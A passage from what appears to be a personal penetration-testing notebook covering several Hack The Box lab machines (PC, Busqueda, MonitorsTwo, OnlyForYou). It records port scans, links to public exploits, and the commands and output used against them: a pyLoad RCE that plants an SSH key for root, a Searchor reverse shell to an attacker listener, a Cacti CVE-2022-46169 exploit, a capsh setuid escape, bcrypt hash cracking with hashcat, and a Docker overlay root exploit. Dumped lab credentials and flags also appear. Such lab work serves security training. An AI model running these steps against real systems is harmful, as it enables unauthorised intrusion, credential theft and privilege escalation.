/tmp/pyLoad

sau@pc:/tmp/pyLoad$ ss -tlnp
State      Recv-Q     Send-Q          Local Address:Port            Peer Address:Port     Process     
LISTEN     0          4096            127.0.0.53%lo:53                   0.0.0.0:*                    
LISTEN     0          128                   0.0.0.0:22                   0.0.0.0:*                    
LISTEN     0          5                   127.0.0.1:8000                 0.0.0.0:*                    
LISTEN     0          128                   0.0.0.0:9666                 0.0.0.0:*                    
LISTEN     0          128                      [::]:22                      [::]:*                    
LISTEN     0          4096                        *:50051                      *:* 



google for pyload exploit

</rich_text>
        <rich_text link="webs https://www.exploit-db.com/exploits/51532">https://www.exploit-db.com/exploits/51532</rich_text>
        <rich_text>

first local port forward

ssh -L 8000:127.0.0.1:8000 sau@10.129.130.68

then run exploit

put my public key in /tmp/test.pub

python3 exploit.py -u </rich_text>
        <rich_text link="webs http://127.0.0.1:8000">http://127.0.0.1:8000</rich_text>
        <rich_text> -c "mkdir /root/.ssh;cat /tmp/test.pub &gt; /root/.ssh/authorized_keys;chmod 600 /root/.ssh/authorized_keys"

ssh root@10.129.130.68
Last login: Mon May 15 09:01:48 2023 from 10.10.14.19
root@pc:~# 
root@pc:~# id
uid=0(root) gid=0(root) groups=0(root)
root@pc:~# ls
Downloads  root.txt  snap  sqlite.db.bak
root@pc:~# cat root.txt 
3dc15d6ad95fd29294eb49b9dfe53d86</rich_text>
      </node>
    </node>
    <node name="Busqueda" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691060196" ts_lastsave="1691135374">
      <node name="nmap" unique_id="34" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691060201" ts_lastsave="1691060446">
        <rich_text>sudo nmap -p- -sC -sV 10.129.129.5 -oA nmap/all -v 
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-08-03 06:54 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
Initiating NSE at 06:54
Completed NSE at 06:54, 0.00s elapsed
Initiating Ping Scan at 06:54
Scanning 10.129.129.5 [4 ports]
Completed Ping Scan at 06:54, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:54
Completed Parallel DNS resolution of 1 host. at 06:54, 0.01s elapsed
Initiating SYN Stealth Scan at 06:54
Scanning 10.129.129.5 [65535 ports]
Discovered open port 22/tcp on 10.129.129.5
Discovered open port 80/tcp on 10.129.129.5
Completed SYN Stealth Scan at 06:55, 15.19s elapsed (65535 total ports)
Initiating Service scan at 06:55
Scanning 2 services on 10.129.129.5
Completed Service scan at 06:55, 6.08s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.129.5.
Initiating NSE at 06:55
Completed NSE at 06:55, 1.19s elapsed
Initiating NSE at 06:55
Completed NSE at 06:55, 0.14s elapsed
Initiating NSE at 06:55
Completed NSE at 06:55, 0.00s elapsed
Nmap scan report for 10.129.129.5
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4f:e3:a6:67:a2:27:f9:11:8d:c3:0e:d7:73:a0:2c:28 (ECDSA)
|_  256 81:6e:78:76:6b:8a:ea:7d:1b:ab:d4:36:b7:f8:ec:c4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs http://searcher.htb/">http://searcher.htb/</rich_text>
        <rich_text>
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 06:55
Completed NSE at 06:55, 0.00s elapsed
Initiating NSE at 06:55
Completed NSE at 06:55, 0.00s elapsed
Initiating NSE at 06:55
Completed NSE at 06:55, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 23.36 seconds
           Raw packets sent: 65749 (2.893MB) | Rcvd: 65536 (2.621MB)</rich_text>
      </node>
      <node name="buster" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691060446" ts_lastsave="1691060507">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://searcher.htb/">http://searcher.htb/</rich_text>
        <rich_text>

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://searcher.htb/">http://searcher.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        5l       20w      153c </rich_text>
        <rich_text link="webs http://searcher.htb/search">http://searcher.htb/search</rich_text>
        <rich_text>
200      GET      430l      751w    13519c </rich_text>
        <rich_text link="webs http://searcher.htb/">http://searcher.htb/</rich_text>
        <rich_text>
403      GET        9l       28w      277c </rich_text>
        <rich_text link="webs http://searcher.htb/server-status">http://searcher.htb/server-status</rich_text>
        <rich_text>
[####################] - 88s    30001/30001   0s      found:3       errors:58     
[####################] - 88s    30000/30000   342/s   </rich_text>
        <rich_text link="webs http://searcher.htb/">http://searcher.htb/</rich_text>
      </node>
      <node name="exploit" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691060507" ts_lastsave="1691401737">
        <rich_text>its running Searchor 2.4.0

google for exploit

</rich_text>
        <rich_text link="webs https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection">https://github.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection</rich_text>
        <rich_text>

./exploit.sh searcher.htb 10.10.14.41
---[Reverse Shell Exploit for Searchor &lt;= 2.4.2 (2.4.0)]---
[*] Input target is searcher.htb
[*] Input attacker is 10.10.14.41:9001
[*] Run the Reverse Shell... Press Ctrl+C after successful connection


nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.129.129.5] 37176
bash: cannot set terminal process group (1458): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$ id
id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
svc@busqueda:/var/www/app$ whoami
whoami
svc
svc@busqueda:~$ cat user	
cat user.txt 
43f6815d624e9f81763b1050e148ac8c

svc@busqueda:~$ cat .gitconfig
cat .gitconfig
[user]
	email = cody@searcher.htb
	name = cody
[core]
	hooksPath = no-hooks
	
put my public key in authorized keys so i can ssh in

svc@busqueda:/var/www/app/.git$ cat config 
[core]
	repositoryformatversion = 0
	filemode = true
	bare = false
	logallrefupdates = true
[remote "origin"]
	url = </rich_text>
        <rich_text link="webs http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git">http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</rich_text>
        <rich_text>
	fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
	remote = origin
	merge = refs/heads/main



cody:jh1usoih2bkjaspwe92


use password for cody

svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
   
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py &lt;action&gt; (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
     
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' gitea | jq
     
"Env": [
      "USER_UID=115",
      "USER_GID=121",
      "GITEA__database__DB_TYPE=mysql",
      "GITEA__database__HOST=db:3306",
      "GITEA__database__NAME=gitea",
      "GITEA__database__USER=gitea",
      "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "USER=git",
      "GITEA_CUSTOM=/data/gitea"
    ],


    "Env": [
      "MYSQL_ROOT_PASSWORD=jI86kGUuj87guWr3RyF",
      "MYSQL_USER=gitea",
      "MYSQL_PASSWORD=yuiu1hoiu4i5ho1uh",
      "MYSQL_DATABASE=gitea",
      "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
      "GOSU_VERSION=1.14",
      "MYSQL_MAJOR=8.0",
      "MYSQL_VERSION=8.0.31-1.el8",
      "MYSQL_SHELL_VERSION=8.0.31-1.el8"
    ],


login to gitea as administrator with password yuiu1hoiu4i5ho1uh

clone repo scripts

cat system-checkup.py

    elif action == 'full-checkup':
        try:
            arg_list = ['./full-checkup.sh']
            print(run_command(arg_list))
            print('[+] Done!')
        except:
            print('Something went wrong')
            exit(1)
            
create file full-checkup.sh with rev shell

file must have #!/bin/bash at top



nc -lvnp 9001             
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.129.129.5] 44230
root@busqueda:/home/svc# id
id
uid=0(root) gid=0(root) groups=0(root)
root@busqueda:/home/svc# cd  
cd 
root@busqueda:~# ls
ls
ecosystem.config.js
root.txt
scripts
snap
root@busqueda:~# cat roo	
cat root.txt 
e43948efddf9a672c8bb00d82eb0f038</rich_text>
      </node>
    </node>
    <node name="MonitorsTwo" unique_id="37" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691135374" ts_lastsave="1691568242">
      <node name="nmap" unique_id="38" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691135377" ts_lastsave="1691135720">
        <rich_text>sudo nmap -p- -sC -sV 10.129.128.135 -oA nmap/all -v
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-08-04 03:53 EDT
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Initiating Ping Scan at 03:53
Scanning 10.129.128.135 [4 ports]
Completed Ping Scan at 03:53, 0.05s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 03:53
Completed Parallel DNS resolution of 1 host. at 03:53, 0.01s elapsed
Initiating SYN Stealth Scan at 03:53
Scanning 10.129.128.135 [65535 ports]
Discovered open port 80/tcp on 10.129.128.135
Discovered open port 22/tcp on 10.129.128.135
Completed SYN Stealth Scan at 03:53, 14.67s elapsed (65535 total ports)
Initiating Service scan at 03:53
Scanning 2 services on 10.129.128.135
Completed Service scan at 03:53, 6.37s elapsed (2 services on 1 host)
NSE: Script scanning 10.129.128.135.
Initiating NSE at 03:53
Completed NSE at 03:53, 2.42s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.43s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.01s elapsed
Nmap scan report for 10.129.128.135
Host is up (0.034s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Login to Cacti
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 4F12CCCD3C42A4A478F067337FE92794
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Initiating NSE at 03:53
Completed NSE at 03:53, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 24.56 seconds
           Raw packets sent: 65557 (2.884MB) | Rcvd: 65536 (2.621MB)</rich_text>
      </node>
      <node name="buster" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691135720" ts_lastsave="1691135931"/>
      <node name="exploit" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691135931" ts_lastsave="1691140044">
        <rich_text>webserver runs cacti 1.2.22

google for exploit

</rich_text>
        <rich_text link="webs https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22">https://github.com/FredBrave/CVE-2022-46169-CACTI-1.2.22</rich_text>
        <rich_text>


python3 exploit.py -u </rich_text>
        <rich_text link="webs http://10.129.128.135/">http://10.129.128.135/</rich_text>
        <rich_text> --LHOST=10.10.14.41 --LPORT=9001
Checking...
The target is vulnerable. Exploiting...
Bruteforcing the host_id and local_data_ids
Bruteforce Success!!


nc -lvnp 9001
listening on [any] 9001 ...
connect to [10.10.14.41] from (UNKNOWN) [10.129.128.135] 45720
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
www-data@50bca5e748b0:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@50bca5e748b0:/var/www/html$ whoami
whoami
www-data


run linpeas.sh

/sbin/capsh has SETUID

search in gtfobins

www-data@50bca5e748b0:/dev/shm$ /sbin/capsh --gid=0 --uid=0 -- 
/sbin/capsh --gid=0 --uid=0 --
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
whoami
root


www-data@50bca5e748b0:/$ cat entrypoint.sh
cat entrypoint.sh
#!/bin/bash
set -ex

wait-for-it db:3306 -t 300 -- echo "database is connected"
if [[ ! $(mysql --host=db --user=root --password=root cacti -e "show tables") =~ "automation_devices" ]]; then
    mysql --host=db --user=root --password=root cacti &lt; /var/www/html/cacti.sql
    mysql --host=db --user=root --password=root cacti -e "UPDATE user_auth SET must_change_password='' WHERE username = 'admin'"
    mysql --host=db --user=root --password=root cacti -e "SET GLOBAL time_zone = 'UTC'"
fi

chown www-data:www-data -R /var/www/html
# first arg is `-f` or `--some-option`
if [ "${1#-}" != "$1" ]; then
	set -- apache2-foreground "$@"
fi

exec "$@"


www-data@50bca5e748b0:/var/www/html$ mysql -h db -u root -p
mysql -h db -u root -p
Enter password: root
use cacti;
select * from user_auth;
exit
id	username	password	realm	full_name	email_address	must_change_password	password_change	show_tree	show_list	show_preview	graph_settings	login_opts	policy_graphs	policy_trees	policy_hosts	policy_graph_templates	enabled	lastchange	lastlogin	password_history	locked	failed_attempts	lastfail	reset_perms
1	admin	$2y$10$IhEA.Og8vrvwueM7VEDkUes3pwc3zaBbQ/iuqMft/llx8utpR1hjC	0	Jamie Thompson	admin@monitorstwo.htb		on	on	on	on	on	2	1	1	1	1on	-1	-1	-1		0	0	663348655
3	guest	43e9a4ab75570f5b	0	Guest Account		on	on	on	on	on	3	1	1	1	1	1		-1	-1	-1		0	00
4	marcus	$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C	0	Marcus Brune	marcus@monitorstwo.htb			on	on	on	on	1	1	1	1	1on	-1	-1		on	0	0	2135691668


crack with hashcat


 hashcat -m 3200 hash rockyou.txt
hashcat (v6.2.6) starting

$2y$10$vcrYth5YcCLlZaPDj6PwqOYTw68W1.3WeKlBn70JonsdW/MhFYK4C:funkymonkey


ssh marcus@10.129.128.135
marcus@10.129.128.135's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-147-generic x86_64)

marcus@monitorstwo:~$ id
uid=1000(marcus) gid=1000(marcus) groups=1000(marcus)
marcus@monitorstwo:~$ whoami
marcus
marcus@monitorstwo:~$ cat user.txt 
e644401fa8148c709c70f8dc65c04ace


run linpeas.sh


google for exploit

</rich_text>
        <rich_text link="webs https://github.com/UncleJ4ck/CVE-2021-41091">https://github.com/UncleJ4ck/CVE-2021-41091</rich_text>
        <rich_text>


marcus@monitorstwo:/dev/shm$ ./exploit.sh 
[!] Vulnerable to CVE-2021-41091
[!] Now connect to your Docker container that is accessible and obtain root access !
[&gt;] After gaining root access execute this command (chmod u+s /bin/bash)

Did you correctly set the setuid bit on /bin/bash in the Docker container? (yes/no): yes
[!] Available Overlay2 Filesystems:
/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged

[!] Iterating over the available Overlay2 filesystems !
[?] Checking path: /var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged
[x] Could not get root access in '/var/lib/docker/overlay2/4ec09ecfa6f3a290dc6b247d7f4ff71a398d4f17060cdaf065e8bb83007effec/merged'

[?] Checking path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[!] Rooted !
[&gt;] Current Vulnerable Path: /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
[?] If it didn't spawn a shell go to this path and execute './bin/bash -p'

[!] Spawning Shell
bash-5.1# exit
marcus@monitorstwo:/dev/shm$ cd /var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged
marcus@monitorstwo:/var/lib/docker/overlay2/c41d5854e43bd996e128d647cb526b73d04c9ad6325201c85f73fdba372cb2f1/merged$ ./bin/bash -p
bash-5.1# id
uid=1000(marcus) gid=1000(marcus) euid=0(root) groups=1000(marcus)
bash-5.1# whoami
root

bash-5.1# cat /root/root.txt
cebacac4cd8f8d5c18173d4ef71c24e6</rich_text>
      </node>
    </node>
    <node name="OnlyForYou" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691568242" ts_lastsave="1691672812">
      <node name="nmap" unique_id="42" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691568245" ts_lastsave="1691568458">
        <rich_text>sudo nmap -p- -sC -sV 10.129.125.2 -oA nmap/all -v 
Starting Nmap 7.94 ( </rich_text>
        <rich_text link="webs https://nmap.org">https://nmap.org</rich_text>
        <rich_text> ) at 2023-08-09 04:05 EDT
Nmap scan report for 10.129.125.2
Host is up (0.033s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 e8:83:e0:a9:fd:43:df:38:19:8a:aa:35:43:84:11:ec (RSA)
|   256 83:f2:35:22:9b:03:86:0c:16:cf:b3:fa:9f:5a:cd:08 (ECDSA)
|_  256 44:5f:7a:a3:77:69:0a:77:78:9b:04:e0:9f:11:db:80 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to </rich_text>
        <rich_text link="webs http://only4you.htb/">http://only4you.htb/</rich_text>
        <rich_text>
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at </rich_text>
        <rich_text link="webs https://nmap.org/submit/">https://nmap.org/submit/</rich_text>
        <rich_text> .
Nmap done: 1 IP address (1 host up) scanned in 35.16 seconds
           Raw packets sent: 65827 (2.896MB) | Rcvd: 65602 (2.624MB)</rich_text>
      </node>
      <node name="buster" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1691568458" ts_lastsave="1691568699">
        <rich_text>feroxbuster -u </rich_text>
        <rich_text link="webs http://only4you.htb/">http://only4you.htb/</rich_text>
        <rich_text>   

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.10.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ </rich_text>
        <rich_text link="webs http://only4you.htb/">http://only4you.htb/</rich_text>
        <rich_text>
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.10.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       37l       58w      674c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
200      GET        7l       27w     3309c </rich_text>
        <rich_text link="webs http://only4you.htb/static/img/apple-touch-icon.png">http://only4you.htb/static/img/apple-touch-icon.png</rich_text>
        <rich_text>
200      GET        9l      155w     5417c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/purecounter/purecounter_vanilla.js">http://only4you.htb/static/vendor/purecounter/purecounter_vanilla.js</rich_text>
        <rich_text>
200      GET      274l      604w     6492c </rich_text>
        <rich_text link="webs http://only4you.htb/static/js/main.js">http://only4you.htb/static/js/main.js</rich_text>
        <rich_text>
200      GET        1l      313w    14690c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/aos/aos.js">http://only4you.htb/static/vendor/aos/aos.js</rich_text>
        <rich_text>
200      GET       90l      527w    40608c </rich_text>
        <rich_text link="webs http://only4you.htb/static/img/testimonials/testimonials-5.jpg">http://only4you.htb/static/img/testimonials/testimonials-5.jpg</rich_text>
        <rich_text>
200      GET        9l       23w      847c </rich_text>
        <rich_text link="webs http://only4you.htb/static/img/favicon.png">http://only4you.htb/static/img/favicon.png</rich_text>
        <rich_text>
200      GET      244l     1332w   103224c </rich_text>
        <rich_text link="webs http://only4you.htb/static/img/testimonials/testimonials-2.jpg">http://only4you.htb/static/img/testimonials/testimonials-2.jpg</rich_text>
        <rich_text>
200      GET       96l      598w    48920c </rich_text>
        <rich_text link="webs http://only4you.htb/static/img/team/team-4.jpg">http://only4you.htb/static/img/team/team-4.jpg</rich_text>
        <rich_text>
200      GET        1l      625w    55880c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/glightbox/js/glightbox.min.js">http://only4you.htb/static/vendor/glightbox/js/glightbox.min.js</rich_text>
        <rich_text>
200      GET       13l      171w    16466c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/swiper/swiper-bundle.min.css">http://only4you.htb/static/vendor/swiper/swiper-bundle.min.css</rich_text>
        <rich_text>
200      GET       88l      408w    36465c </rich_text>
        <rich_text link="webs http://only4you.htb/static/img/testimonials/testimonials-4.jpg">http://only4you.htb/static/img/testimonials/testimonials-4.jpg</rich_text>
        <rich_text>
200      GET      159l      946w    71778c </rich_text>
        <rich_text link="webs http://only4you.htb/static/img/team/team-1.jpg">http://only4you.htb/static/img/team/team-1.jpg</rich_text>
        <rich_text>
200      GET      160l      818w    71959c </rich_text>
        <rich_text link="webs http://only4you.htb/static/img/testimonials/testimonials-1.jpg">http://only4you.htb/static/img/testimonials/testimonials-1.jpg</rich_text>
        <rich_text>
200      GET      112l      805w    65527c </rich_text>
        <rich_text link="webs http://only4you.htb/static/img/team/team-3.jpg">http://only4you.htb/static/img/team/team-3.jpg</rich_text>
        <rich_text>
200      GET     1936l     3839w    34056c </rich_text>
        <rich_text link="webs http://only4you.htb/static/css/style.css">http://only4you.htb/static/css/style.css</rich_text>
        <rich_text>
200      GET        1l      233w    13749c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/glightbox/css/glightbox.min.css">http://only4you.htb/static/vendor/glightbox/css/glightbox.min.css</rich_text>
        <rich_text>
200      GET        1l      218w    26053c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/aos/aos.css">http://only4you.htb/static/vendor/aos/aos.css</rich_text>
        <rich_text>
200      GET     1876l     9310w    88585c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/bootstrap-icons/bootstrap-icons.css">http://only4you.htb/static/vendor/bootstrap-icons/bootstrap-icons.css</rich_text>
        <rich_text>
200      GET      172l     1093w    87221c </rich_text>
        <rich_text link="webs http://only4you.htb/static/img/team/team-2.jpg">http://only4you.htb/static/img/team/team-2.jpg</rich_text>
        <rich_text>
200      GET       12l      557w    35445c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/isotope-layout/isotope.pkgd.min.js">http://only4you.htb/static/vendor/isotope-layout/isotope.pkgd.min.js</rich_text>
        <rich_text>
200      GET     2317l    11522w   110438c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/remixicon/remixicon.css">http://only4you.htb/static/vendor/remixicon/remixicon.css</rich_text>
        <rich_text>
200      GET       14l     1683w   143281c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/swiper/swiper-bundle.min.js">http://only4you.htb/static/vendor/swiper/swiper-bundle.min.js</rich_text>
        <rich_text>
200      GET        7l     1225w    80457c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/bootstrap/js/bootstrap.bundle.min.js">http://only4you.htb/static/vendor/bootstrap/js/bootstrap.bundle.min.js</rich_text>
        <rich_text>
200      GET        1l      133w    66571c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/boxicons/css/boxicons.min.css">http://only4you.htb/static/vendor/boxicons/css/boxicons.min.css</rich_text>
        <rich_text>
200      GET       71l      380w    30729c </rich_text>
        <rich_text link="webs http://only4you.htb/static/img/testimonials/testimonials-3.jpg">http://only4you.htb/static/img/testimonials/testimonials-3.jpg</rich_text>
        <rich_text>
200      GET        7l     2208w   195498c </rich_text>
        <rich_text link="webs http://only4you.htb/static/vendor/bootstrap/css/bootstrap.min.css">http://only4you.htb/static/vendor/bootstrap/css/bootstrap.min.css</rich_text>
        <rich_text>
200      GET      673l     2150w    34125c </rich_text>
        <rich_text link="webs http://only4you.htb/">http://only4you.htb/</rich_text>
        <rich_text>
[####################] - 35s    30050/30050   0s      found:27      errors:0      
[####################] - 35s    30000/30000   864/s   </rich_text>
        <rich_text link="webs http://only4you.htb/">http://only4you.htb/</rich_text>
        <rich_text>





gobuster vhost -u </rich_text>
        <rich_text link="webs http://only4you.htb">http://only4you.htb</rich_text>
        <rich_text> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)
===============================================================
[+] Url:             </rich_text>
        <rich_text link="webs http://only4you.htb">http://only4you.htb</rich_text>
        <rich_text>
[+] Method:          GET
[+] Threads:         10
[+] Wordlist:        /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:      gobuster/3.5
[+] Timeout:         10s
[+] Append Domain:   true
===============================================================
2023/08/09 04:08:05 Starting gobuster in VHOST enumeration mode
===============================================================
Found: beta.only4you.htb Status: 200 [Size: 2191]
Progress: 4934 / 4990 (98.88%)
===============================================================
